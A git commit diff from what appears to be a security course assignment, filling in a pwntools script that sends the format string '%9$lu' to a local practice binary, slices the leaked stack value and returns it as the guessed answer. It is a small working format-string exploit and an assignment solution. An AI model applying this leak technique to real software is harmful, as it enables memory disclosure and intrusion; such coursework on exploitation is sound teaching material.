87168b7f489de61ed5c1bc6ecd74845a01e911bd
ashleyjwu <155711021+ashleyjwu@users.noreply.github.com>
2025-11-07 22:03:35 +0000

    part1

--- assignment-2/1-format-me/part1.py
+++ assignment-2/1-format-me/part1.py
@@ -9,13 +9,13 @@ r = process([exe.path])
 
 for _ in range(10):
     # Add your code Here
-    r.recvuntil(b"xxx") # Think about what should be received first?
-    r.sendline(b"xxx") # Add your format string code here!
+    r.recvuntil(b"Recipient? ") # Think about what should be received first?
+    r.sendline(b"%9$lu") # Add your format string code here!
     leak = r.recvline()
     # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
-    val = leak[idx_1:idx_2] # you need to fill in idx_1, and idx_2 by yourself
-    
-    r.recvuntil(b"xxx") #Think about what should be received?
+    val = leak[11:-1] # you need to fill in idx_1, and idx_2 by yourself
+
+    r.recvuntil(b"Guess? ") #Think about what should be received?
     r.sendline(val) 
     r.recvuntil(b"Correct")
 
